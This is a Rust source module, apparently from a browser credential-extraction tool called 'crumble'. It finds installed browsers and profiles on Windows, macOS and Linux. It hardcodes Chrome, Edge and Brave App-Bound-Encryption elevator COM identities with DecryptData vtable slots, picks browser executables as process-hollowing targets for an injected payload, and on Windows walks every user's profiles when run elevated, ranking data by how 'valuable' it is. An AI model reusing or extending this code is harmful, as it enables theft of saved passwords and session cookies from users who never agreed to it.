//! Browser and profile discovery.
//!
//! The candidate table is static per OS family (install roots, browser binary
//! candidates, ABE COM identities); discovery is that table filtered by what
//! exists on disk. Only the Chromium family's secrets are decryptable;
//! Firefox artifacts are plaintext/metadata-only and Safari is inventory-only.

use std::path::PathBuf;

use crate::local_state;
use crate::options::RunOptions;

/// A COM GUID as plain data (converted to the OS layout at the Windows-only
/// call sites, keeping this module platform-neutral).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Guid {
    pub data1: u32,
    pub data2: u16,
    pub data3: u16,
    pub data4: [u8; 8],
}

#[cfg(any(windows, test))]
pub const fn guid(data1: u32, data2: u16, data3: u16, data4: [u8; 8]) -> Guid {
    Guid {
        data1,
        data2,
        data3,
        data4,
    }
}

/// How to reach a Chromium family's App-Bound-Encryption elevator service
/// (per the public Chromium `elevator.h`).
#[derive(Debug, Clone)]
#[cfg_attr(not(windows), allow(dead_code))]
pub struct AbeIdentity {
    /// The elevation service's COM class id.
    pub clsid: Guid,
    /// Interface ids to try in order (IElevator2 first, then IElevator).
    pub iids: [Guid; 2],
    /// Vtable slot of `DecryptData` for this family.
    pub decrypt_slot: usize,
}

/// The storage family a browser belongs to (drives extraction strategy).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Family {
    /// Chromium engine: SQLite stores; ABE/DPAPI (Windows), Keychain (macOS)
    /// or hardcoded-key (Linux) master keys.
    Chromium,
    /// Firefox: SQLite/JSON stores; logins NSS-encrypted (never decrypted —
    /// metadata only), cookie values plaintext.
    Firefox,
    /// Safari: binary plist stores keyed to the user's Keychain — inventory.
    Safari,
}

/// One browser installation discovered on the host.
#[derive(Debug, Clone)]
pub struct Browser {
    /// Normalized id ("chrome" | "edge" | ...).
    pub id: &'static str,
    /// Human-facing name ("Chrome", "Microsoft Edge", ...).
    pub label: &'static str,
    /// Storage family.
    pub family: Family,
    /// The user-data root holding profiles (exists on disk).
    pub user_data: PathBuf,
    /// macOS Keychain service holding the "Safe Storage" password ("" = none).
    #[cfg_attr(not(target_os = "macos"), allow(dead_code))]
    pub safe_storage: &'static str,
    /// ABE COM identity (Windows Chromium only; `None` = DPAPI/legacy only).
    #[cfg_attr(not(windows), allow(dead_code))]
    pub abe: Option<AbeIdentity>,
    /// Browser binary candidates for hollowing, best first (Windows only).
    #[cfg_attr(not(windows), allow(dead_code))]
    pub exe_candidates: Vec<PathBuf>,
}

/// One discovered profile within a browser.
#[derive(Debug, Clone)]
pub struct Profile {
    /// On-disk profile directory name ("Default", "Profile 1", ...).
    pub name: String,
    /// Human-facing profile name when the browser records one.
    pub display_name: String,
    /// The profile directory.
    pub path: PathBuf,
    /// Whether this is the browser's default/active profile.
    pub is_default: bool,
}

/// The browsers installed on this host, filtered by the run's selection. A
/// browser counts as installed when its user-data root exists.
#[must_use]
pub fn installed(options: &RunOptions) -> Vec<Browser> {
    candidates()
        .into_iter()
        .filter(|b| b.user_data.is_dir())
        .filter(|b| options.wants_browser(b.id))
        .collect()
}

/// A browser's profiles: default first, then ascending profile dirs.
#[must_use]
pub fn profiles(browser: &Browser) -> Vec<Profile> {
    match browser.family {
        Family::Chromium => chromium_profiles(browser),
        Family::Firefox => firefox_profiles(browser),
        Family::Safari => vec![Profile {
            name: "safari".to_string(),
            display_name: "Safari".to_string(),
            path: browser.user_data.clone(),
            is_default: true,
        }],
    }
}

fn chromium_profiles(browser: &Browser) -> Vec<Profile> {
    let display_names = local_state::profile_display_names(&browser.user_data);
    let mut out: Vec<Profile> = Vec::new();
    let Ok(entries) = std::fs::read_dir(&browser.user_data) else {
        return out;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_dir() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().into_owned();
        if name != "Default" && !name.starts_with("Profile ") {
            continue;
        }
        out.push(Profile {
            display_name: display_names.get(&name).cloned().unwrap_or_default(),
            is_default: name == "Default",
            name,
            path,
        });
    }
    // Root-layout browsers (Opera on every OS) keep stores directly in the
    // user-data root with no Default/Profile N subdirectory.
    if out.is_empty()
        && (browser.user_data.join("Login Data").is_file()
            || browser.user_data.join("Local State").is_file())
    {
        out.push(Profile {
            name: "Default".to_string(),
            display_name: browser.label.to_string(),
            path: browser.user_data.clone(),
            is_default: true,
        });
    }
    out.sort_by(|a, b| b.is_default.cmp(&a.is_default).then(a.name.cmp(&b.name)));
    out
}

fn firefox_profiles(browser: &Browser) -> Vec<Profile> {
    let Ok(content) = std::fs::read_to_string(browser.user_data.join("profiles.ini")) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    let mut section: Vec<(String, String)> = Vec::new();
    let mut in_profile = false;
    for raw in content.lines() {
        let line = raw.trim();
        if let Some(header) = line.strip_prefix('[') {
            if in_profile {
                flush_section(&section, &browser.user_data, &mut out);
            }
            in_profile = header.to_ascii_lowercase().starts_with("profile");
            section.clear();
        } else if in_profile {
            if let Some((key, value)) = line.split_once('=') {
                section.push((key.trim().to_ascii_lowercase(), value.trim().to_string()));
            }
        }
    }
    if in_profile {
        flush_section(&section, &browser.user_data, &mut out);
    }
    out
}

/// One `[ProfileN]` section → one profile entry (missing path or a
/// non-existent directory yields nothing).
fn flush_section(
    section: &[(String, String)],
    user_data: &std::path::Path,
    out: &mut Vec<Profile>,
) {
    let get = |k: &str| section.iter().find(|(key, _)| key == k).map(|(_, v)| v);
    let Some(raw_path) = get("path") else {
        return;
    };
    let path = if get("isrelative").is_some_and(|v| v == "1") {
        user_data.join(raw_path)
    } else {
        PathBuf::from(raw_path)
    };
    if !path.is_dir() {
        return;
    }
    let name = get("name").cloned().unwrap_or_default();
    out.push(Profile {
        display_name: name.clone(),
        is_default: get("default").is_some_and(|v| v == "1"),
        name,
        path,
    });
}

/// The per-OS candidate table; discovery filters it against the filesystem.
fn candidates() -> Vec<Browser> {
    #[cfg(windows)]
    {
        windows::candidates()
    }
    #[cfg(target_os = "macos")]
    {
        macos::candidates()
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    {
        linux::candidates()
    }
    #[cfg(not(any(unix, windows)))]
    {
        Vec::new()
    }
}

/// The home directory without deprecated `std::env::home_dir`. Windows builds
/// the candidate table per user root instead.
#[cfg(not(windows))]
fn home() -> Option<PathBuf> {
    std::env::var_os("HOME").map(PathBuf::from)
}

/// The first existing browser binary, best candidate first (Windows-only:
/// the hollowing caller is too).
#[cfg(windows)]
#[must_use]
pub fn hollow_target(browser: &Browser) -> Option<PathBuf> {
    browser.exe_candidates.iter().find(|p| p.is_file()).cloned()
}

/// A descriptor with only static fields filled (empty paths), for the
/// hollowed payload: the injector supplies the authoritative per-user
/// user-data root through the request channel, and the payload's sanitized
/// environment may see no candidates at all. `None` for unknown ids.
#[cfg(windows)]
#[must_use]
pub fn descriptor_for(id: &str) -> Option<Browser> {
    windows::static_descriptor(id)
}

/// How many candidates this process can currently see (payload diagnostics
/// for its "root not found" path).
#[cfg(windows)]
#[must_use]
pub fn candidate_count() -> usize {
    candidates().len()
}

#[cfg(target_os = "macos")]
mod macos {
    use super::*;

    pub(super) fn candidates() -> Vec<Browser> {
        let Some(home) = home() else {
            return Vec::new();
        };
        let support = home.join("Library/Application Support");
        let chromium = |id: &'static str,
                        label: &'static str,
                        dir: &'static str,
                        storage: &'static str| Browser {
            id,
            label,
            family: Family::Chromium,
            user_data: support.join(dir),
            safe_storage: storage,
            abe: None,
            exe_candidates: Vec::new(),
        };
        vec![
            chromium("chrome", "Chrome", "Google/Chrome", "Chrome Safe Storage"),
            chromium(
                "edge",
                "Microsoft Edge",
                "Microsoft Edge",
                "Microsoft Edge Safe Storage",
            ),
            chromium(
                "brave",
                "Brave",
                "BraveSoftware/Brave-Browser",
                "Brave Safe Storage",
            ),
            chromium("chromium", "Chromium", "Chromium", "Chromium Safe Storage"),
            chromium(
                "opera",
                "Opera",
                "com.operasoftware.Opera",
                "Opera Safe Storage",
            ),
            chromium("vivaldi", "Vivaldi", "Vivaldi", "Vivaldi Safe Storage"),
            Browser {
                id: "firefox",
                label: "Firefox",
                family: Family::Firefox,
                user_data: support.join("Firefox"),
                safe_storage: "",
                abe: None,
                exe_candidates: Vec::new(),
            },
            Browser {
                id: "safari",
                label: "Safari",
                family: Family::Safari,
                user_data: home.join("Library/Safari"),
                safe_storage: "",
                abe: None,
                exe_candidates: Vec::new(),
            },
        ]
    }
}

#[cfg(all(unix, not(target_os = "macos")))]
mod linux {
    use super::*;

    pub(super) fn candidates() -> Vec<Browser> {
        let Some(home) = home() else {
            return Vec::new();
        };
        let config = home.join(".config");
        let chromium = |id: &'static str, label: &'static str, dir: &'static str| Browser {
            id,
            label,
            family: Family::Chromium,
            user_data: config.join(dir),
            safe_storage: "",
            abe: None,
            exe_candidates: Vec::new(),
        };
        vec![
            chromium("chrome", "Chrome", "google-chrome"),
            chromium("edge", "Microsoft Edge", "microsoft-edge"),
            chromium("brave", "Brave", "BraveSoftware/Brave-Browser"),
            chromium("chromium", "Chromium", "chromium"),
            chromium("opera", "Opera", "opera"),
            chromium("vivaldi", "Vivaldi", "vivaldi"),
            Browser {
                id: "firefox",
                label: "Firefox",
                family: Family::Firefox,
                user_data: home.join(".mozilla/firefox"),
                safe_storage: "",
                abe: None,
                exe_candidates: Vec::new(),
            },
        ]
    }
}

#[cfg(windows)]
mod windows {
    use super::*;

    /// Chrome stable/beta and Brave share the IElevator2 IID.
    const IELEVATOR2_CHROMIUM: Guid = guid(
        0x1BF5_208B,
        0x295F,
        0x4992,
        [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
    );

    fn abe_chrome() -> AbeIdentity {
        AbeIdentity {
            clsid: guid(
                0x7088_60E0,
                0xF641,
                0x4611,
                [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
            ),
            iids: [
                IELEVATOR2_CHROMIUM,
                guid(
                    0x463A_BECF,
                    0x410D,
                    0x407F,
                    [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8],
                ),
            ],
            decrypt_slot: 5,
        }
    }

    fn abe_edge() -> AbeIdentity {
        AbeIdentity {
            clsid: guid(
                0x1FCB_E96C,
                0x1697,
                0x43AF,
                [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67],
            ),
            iids: [
                guid(
                    0x8F7B_6792,
                    0x784D,
                    0x4047,
                    [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05],
                ),
                guid(
                    0xC9C2_B807,
                    0x7731,
                    0x4F34,
                    [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B],
                ),
            ],
            decrypt_slot: 8,
        }
    }

    fn abe_brave() -> AbeIdentity {
        AbeIdentity {
            clsid: guid(
                0x576B_31AF,
                0x6369,
                0x4B6B,
                [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B],
            ),
            iids: [
                IELEVATOR2_CHROMIUM,
                guid(
                    0xF396_861E,
                    0x0C8E,
                    0x4C71,
                    [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9],
                ),
            ],
            decrypt_slot: 5,
        }
    }

    pub(super) fn static_descriptor(id: &str) -> Option<Browser> {
        let mk = |family: Family, abe: Option<AbeIdentity>| {
            let (label, family_id) = match (id, family) {
                (_, Family::Firefox) => ("Firefox", "firefox"),
                _ => match id {
                    "chrome" => ("Chrome", "chrome"),
                    "edge" => ("Microsoft Edge", "edge"),
                    "brave" => ("Brave", "brave"),
                    "chromium" => ("Chromium", "chromium"),
                    "vivaldi" => ("Vivaldi", "vivaldi"),
                    _ => ("Opera", "opera"),
                },
            };
            Some(Browser {
                id: family_id,
                label,
                family,
                user_data: PathBuf::new(),
                safe_storage: "",
                abe,
                exe_candidates: Vec::new(),
            })
        };
        match id {
            "chrome" => mk(Family::Chromium, Some(abe_chrome())),
            "edge" => mk(Family::Chromium, Some(abe_edge())),
            "brave" => mk(Family::Chromium, Some(abe_brave())),
            "chromium" | "vivaldi" | "opera" => mk(Family::Chromium, None),
            "firefox" => mk(Family::Firefox, None),
            _ => None,
        }
    }

    pub(super) fn candidates() -> Vec<Browser> {
        // Interactive users' artifacts, not necessarily the account we run
        // as: an elevated (admin/SYSTEM) run must still see every user's
        // profiles. Enumerate every profile root under %SystemDrive%\Users
        // (current user first) and build the table per user.
        let program_files: Vec<PathBuf> = ["PROGRAMFILES", "ProgramFiles(x86)"]
            .iter()
            .filter_map(std::env::var_os)
            .map(PathBuf::from)
            .collect();
        let mut out = Vec::new();
        for root in user_roots() {
            let local = root.join(r"AppData\Local");
            let roaming = root.join(r"AppData\Roaming");
            out.extend(per_user(&local, &roaming, &program_files));
        }
        out
    }

    /// Every interactive user profile root, current user first. Skips the
    /// well-known non-user hives and any directory without an AppData tree.
    fn user_roots() -> Vec<PathBuf> {
        let system_drive = std::env::var_os("SYSTEMDRIVE").unwrap_or_else(|| "C:".into());
        let users_root = PathBuf::from(system_drive).join("Users");
        let current = std::env::var_os("USERPROFILE").map(PathBuf::from);
        let mut roots: Vec<PathBuf> = user_dirs_in(&users_root)
            .into_iter()
            .filter(|dir| current.as_ref().is_none_or(|c| dir != c))
            .collect();
        // Current user first: its decryption context (DPAPI) is reachable, so
        // its data is the most valuable to process first.
        if let Some(current) = current {
            roots.insert(0, current);
        }
        roots
    }

    /// Directories under a `Users` root that look like real user profiles.
    /// Compiled for tests on every platform.
    #[cfg(any(test, windows))]
    fn user_dirs_in(users_root: &PathBuf) -> Vec<PathBuf> {
        const SKIP: &[&str] = &["public", "default", "default user", "all users"];
        let mut out = Vec::new();
        let Ok(entries) = std::fs::read_dir(users_root) else {
            return out;
        };
        for entry in entries.flatten() {
            let dir = entry.path();
            if !dir.is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_ascii_lowercase();
            if SKIP.contains(&name.as_str()) || !dir.join(r"AppData\Local").is_dir() {
                continue;
            }
            out.push(dir);
        }
        out.sort();
        out
    }

    fn per_user(
        local: &std::path::Path,
        roaming: &std::path::Path,
        program_files: &[PathBuf],
    ) -> Vec<Browser> {
        // Browser binaries: per-user installs land under LOCALAPPDATA, system
        // installs under ProgramFiles (x86 for Edge). Best candidate first.
        let exes = |rel: &str, per_user: bool| -> Vec<PathBuf> {
            let mut out = Vec::new();
            if per_user {
                out.push(local.join(rel));
            }
            out.extend(program_files.iter().map(|pf| pf.join(rel)));
            if !per_user {
                out.push(local.join(rel));
            }
            out
        };
        let chromium = |id: &'static str,
                        label: &'static str,
                        dir: String,
                        abe: Option<AbeIdentity>,
                        exe: Vec<PathBuf>,
                        root: &std::path::Path| {
            let family = if id == "firefox" {
                Family::Firefox
            } else {
                Family::Chromium
            };
            Browser {
                id,
                label,
                family,
                user_data: root.join(dir),
                safe_storage: "",
                abe,
                exe_candidates: exe,
            }
        };
        let out = vec![
            chromium(
                "chrome",
                "Chrome",
                r"Google\Chrome\User Data".to_string(),
                Some(abe_chrome()),
                exes(r"Google\Chrome\Application\chrome.exe", false),
                local,
            ),
            chromium(
                "edge",
                "Microsoft Edge",
                r"Microsoft\Edge\User Data".to_string(),
                Some(abe_edge()),
                exes(r"Microsoft\Edge\Application\msedge.exe", false),
                local,
            ),
            chromium(
                "brave",
                "Brave",
                r"BraveSoftware\Brave-Browser\User Data".to_string(),
                Some(abe_brave()),
                exes(r"BraveSoftware\Brave-Browser\Application\brave.exe", false),
                local,
            ),
            chromium(
                "chromium",
                "Chromium",
                r"Chromium\User Data".to_string(),
                None,
                exes(r"Chromium\Application\chrome.exe", false),
                local,
            ),
            chromium(
                "vivaldi",
                "Vivaldi",
                r"Vivaldi\User Data".to_string(),
                None,
                exes(r"Vivaldi\Application\vivaldi.exe", true),
                local,
            ),
            // Opera's profile data lives in Roaming AppData (stores sit at the
            // root — the root-layout fallback in `chromium_profiles` covers the
            // missing Default/ subdirectory).
            chromium(
                "opera",
                "Opera",
                r"Opera Software\Opera Stable".to_string(),
                None,
                exes(r"Programs\Opera\opera.exe", true),
                roaming,
            ),
            chromium(
                "firefox",
                "Firefox",
                r"Mozilla\Firefox".to_string(),
                None,
                Vec::new(),
                roaming,
            ),
        ];
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn chromium_def(user_data: PathBuf) -> Browser {
        Browser {
            id: "chrome",
            label: "Chrome",
            family: Family::Chromium,
            user_data,
            safe_storage: "",
            abe: None,
            exe_candidates: Vec::new(),
        }
    }

    #[test]
    fn chromium_profiles_finds_default_and_numbered() {
        let root =
            std::env::temp_dir().join(format!("crumble-test-inventory-{}", std::process::id()));
        let user_data = root.join("User Data");
        fs::create_dir_all(user_data.join("Default")).unwrap();
        fs::create_dir_all(user_data.join("Profile 1")).unwrap();
        fs::create_dir_all(user_data.join("Profile 10")).unwrap();
        fs::create_dir_all(user_data.join("System Profile")).unwrap(); // skipped
        fs::write(
            user_data.join("Local State"),
            r#"{"profile":{"info_cache":{"Default":{"name":"Person 1"},"Profile 1":{"name":"Work"}}}}"#,
        )
        .unwrap();

        let found = profiles(&chromium_def(user_data.clone()));
        assert_eq!(found.len(), 3);
        assert_eq!(found[0].name, "Default");
        assert!(found[0].is_default);
        assert_eq!(found[0].display_name, "Person 1");
        assert_eq!(found[1].name, "Profile 1");
        assert_eq!(found[1].display_name, "Work");
        assert_eq!(found[2].name, "Profile 10");
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn chromium_root_layout_fallback() {
        // Opera: stores at the root, no profile dirs at all.
        let root = std::env::temp_dir().join(format!("crumble-test-opera-{}", std::process::id()));
        let user_data = root.join("Opera Stable");
        fs::create_dir_all(&user_data).unwrap();
        fs::write(user_data.join("Login Data"), b"").unwrap();
        fs::create_dir_all(user_data.join("Crash Reports")).unwrap(); // noise

        let def = Browser {
            id: "opera",
            label: "Opera",
            family: Family::Chromium,
            user_data: user_data.clone(),
            safe_storage: "",
            abe: None,
            exe_candidates: Vec::new(),
        };
        let found = profiles(&def);
        assert_eq!(found.len(), 1);
        assert!(found[0].is_default);
        assert_eq!(found[0].path, user_data);

        // An empty root invents nothing.
        let empty =
            std::env::temp_dir().join(format!("crumble-test-opera2-{}", std::process::id()));
        fs::create_dir_all(&empty).unwrap();
        let def = Browser {
            user_data: empty,
            ..def
        };
        assert!(profiles(&def).is_empty());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn firefox_profiles_ini_parse() {
        let root = std::env::temp_dir().join(format!("crumble-test-ff-{}", std::process::id()));
        let ff = root.join("Firefox");
        fs::create_dir_all(ff.join("Profiles/abc123.default-release")).unwrap();
        fs::create_dir_all(ff.join("Profiles/xyz789.default")).unwrap();
        fs::write(
            ff.join("profiles.ini"),
            "[Profile0]\nName=default-release\nIsRelative=1\nPath=Profiles/abc123.default-release\nDefault=1\n\n[Profile1]\nName=default\nIsRelative=1\nPath=Profiles/xyz789.default\n",
        )
        .unwrap();

        let def = Browser {
            id: "firefox",
            label: "Firefox",
            family: Family::Firefox,
            user_data: ff,
            safe_storage: "",
            abe: None,
            exe_candidates: Vec::new(),
        };
        let found = profiles(&def);
        assert_eq!(found.len(), 2);
        assert_eq!(found[0].name, "default-release");
        assert!(found[0].is_default);
        assert_eq!(found[1].name, "default");
        assert!(!found[1].is_default);
        let _ = fs::remove_dir_all(&root);
    }

    #[cfg(windows)]
    #[test]
    fn user_dirs_skip_shared_hives() {
        let root = std::env::temp_dir().join(format!("crumble-test-users-{}", std::process::id()));
        for (name, appdata) in [
            ("alice", true),
            ("bob", true),
            ("Public", true),
            ("Default", true),
            ("carlos", false),
        ] {
            let dir = root.join(name);
            if appdata {
                fs::create_dir_all(dir.join(r"AppData\Local")).unwrap();
            } else {
                fs::create_dir_all(&dir).unwrap();
            }
        }
        let names: Vec<String> = windows::user_dirs_in(&root)
            .iter()
            .map(|d| d.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(names, vec!["alice".to_string(), "bob".to_string()]);
        let _ = fs::remove_dir_all(&root);
    }
}
